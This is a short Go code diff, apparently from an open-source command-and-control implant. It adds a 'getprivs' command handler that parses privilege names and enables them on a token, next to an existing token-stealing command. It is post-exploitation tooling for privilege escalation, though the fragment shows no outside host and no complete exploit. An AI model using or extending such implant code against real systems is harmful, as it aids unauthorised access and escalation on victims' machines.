@@ -153,6 +153,20 @@ func CmdGetUid() ([]byte, error) {
 	return packet.GetUid()
 }
 
+func CmdGetPrivs(b []byte, token uintptr) ([]byte, error) {
+	privCnt := int(packet.ReadShort(b[:2]))
+	buf := bytes.NewBuffer(b[2:])
+	privs := make([]string, privCnt)
+	for i := 0; i < privCnt; i++ {
+		tmp, err := util.ParseAnArg(buf)
+		if err != nil {
+			return nil, err
+		}
+		privs[i] = string(tmp)
+	}
+	return packet.GetPrivs(privs, token)
+}
+
 func CmdStealToken(cmdBuf []byte) (uintptr, []byte, error) {
 	pid := packet.ReadInt(cmdBuf[:4])
 	return packet.Steal_token(pid)
